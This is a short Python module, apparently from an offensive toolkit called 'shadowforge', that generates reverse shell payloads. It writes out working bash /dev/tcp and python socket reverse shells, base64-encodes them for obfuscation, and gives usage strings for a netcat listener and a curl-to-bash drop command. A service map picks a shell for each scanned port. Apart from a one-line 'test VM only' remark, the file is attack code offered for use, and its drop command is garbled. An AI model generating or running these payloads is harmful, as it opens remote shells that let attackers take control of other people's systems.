# src/shadowforge/modules/payloads.py
import base64
import socket
from typing import Dict, Any

def gen_reverse_shell(target_ip: str, port: int = 4444, shell_type: str = 'bash') -> Dict[str, Any]:
    """
    Forge reverse shell payload. Obfuscate with base64. Ethical: Test VM only—listener: nc -lvnp {port}.
    Returns dict: raw shell, encoded, usage.
    """
    if shell_type == 'bash':
        raw_shell = f"bash -i >& /dev/tcp/{target_ip}/{port} 0>&1"
    elif shell_type == 'python':
        raw_shell = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target_ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    else:
        return {"error": f"Shell type '{shell_type}' unsupported—bash or python only."}

    encoded = base64.b64encode(raw_shell.encode()).decode()
    payload = {
        "target": target_ip,
        "port": port,
        "type": shell_type,
        "raw": raw_shell,
        "encoded": encoded,  # Usage: echo {encoded} | base64 -d > shell.sh; chmod +x shell.sh
        "usage": f"Listener: nc -lvnp {port}\nDrop: curl -d '{encoded}' {target_ip}:80/shell.txt | base64 -d | bash"  # HTTP tease
    }
    return payload

def gen_for_port(service: str, target_ip: str, port: int) -> Dict[str, Any]:
    """Chain tease: Match service to shell (e.g., ssh → bash)."""
    shell_map = {"ssh": "bash", "http": "python", "default": "bash"}
    shell_type = shell_map.get(service.lower(), "bash")
    return gen_reverse_shell(target_ip, port, shell_type)